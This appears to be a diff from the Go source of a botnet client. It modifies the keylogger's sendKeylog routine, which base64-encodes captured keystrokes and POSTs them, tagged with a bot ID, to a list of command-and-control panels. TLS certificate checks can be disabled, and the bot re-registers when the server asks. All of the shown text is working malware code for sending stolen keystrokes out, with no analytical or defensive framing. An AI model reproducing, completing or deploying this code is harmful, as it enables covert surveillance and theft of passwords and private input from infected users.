@@ -167,10 +167,12 @@ func registerBot() {
 	}
 }
 
-func sendKeylog() {
+func sendKeylog(ch <-chan struct{}) {
 	for isKeyLogging {
-		if tmpKeylog != "" {
-			time.Sleep(time.Duration(autoKeyloggerInterval) * time.Minute)
+		// if tmpKeylog != "" {
+		select {
+		case _ = <-ch:
+			fmt.Println(tmpKeylog)
 			if useSSL {
 				tr := &http.Transport{
 					TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
@@ -180,7 +182,7 @@ func sendKeylog() {
 				for i := 0; i < len(httpPanels); i++ {
 					data := url.Values{}
 					data.Set("0", myUID)
-					data.Add("1", base64Encode(tmpKeylog))
+					data.Add("1", base64Encode(tmpKeylog.String()))
 					u, _ := url.ParseRequestURI(httpPanels[i] + "key")
 					urlStr := fmt.Sprintf("%v", u)
 					r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
@@ -198,7 +200,7 @@ func sendKeylog() {
 									registerBot()
 									break
 								} else {
-									tmpKeylog = "" //Make sure to clear the old logs from memory
+									tmpKeylog.Reset() //Make sure to clear the old logs from memory
 									break
 								}
 							}
@@ -211,7 +213,7 @@ func sendKeylog() {
 				for i := 0; i < len(httpPanels); i++ {
 					data := url.Values{}
 					data.Set("0", myUID)
-					data.Add("1", base64Encode(tmpKeylog))
+					data.Add("1", base64Encode(tmpKeylog.String()))
 					u, _ := url.ParseRequestURI(httpPanels[i] + "key")
 					urlStr := fmt.Sprintf("%v", u)
 					r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
@@ -229,7 +231,7 @@ func sendKeylog() {
 									registerBot()
 									break
 								} else {
-									tmpKeylog = "" //Make sure to clear the old logs from memory
+									tmpKeylog.Reset() //Make sure to clear the old logs from memory
 									break
 								}
 							}
